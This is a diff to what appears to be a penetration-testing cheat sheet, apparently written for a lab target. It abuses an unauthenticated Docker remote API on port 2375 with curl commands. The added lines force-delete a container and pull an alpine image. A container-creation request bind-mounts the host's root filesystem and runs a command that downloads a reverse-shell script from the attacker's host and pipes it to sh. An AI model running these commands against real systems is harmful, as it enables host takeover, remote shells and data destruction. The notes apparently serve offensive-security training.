@@ -767,12 +767,19 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 +---------- List Containers ----------+
 (echo -e "ID\tSTATE\tIMAGE\tIP"; curl -s http://$TARGET:2375/containers/json?all=true | jq -r '.[] | [.Id, .State, .Image, (.NetworkSettings.Networks | to_entries[0].value.IPAddress)] | @tsv') | column -t
 
++---------- Remove Containers ----------+
+curl -s -X DELETE http://$TARGET:2375/containers/7d9f2df890e2ce4a9c8342a64c33c01755b800b2c6b7b6106fce93fe056da256?force=true
+
 +---------- List Images ----------+
 curl -s http://$TARGET:2375/images/json
 "RepoTags":["alpine:latest"]
 
-+---------- Create Container with RCE ----------+
++---------- Create Image ----------+
+curl -s -X POST http://10.129.121.211:2375/images/create?fromImage=alpine&tag=latest
+
++---------- Create Container using Image and RCE ----------+
 curl -X POST http://$TARGET:2375/containers/create -H "Content-Type: application/json" -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"alpine:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:8888/shells/resh | sh"]}'
+
 
 
 
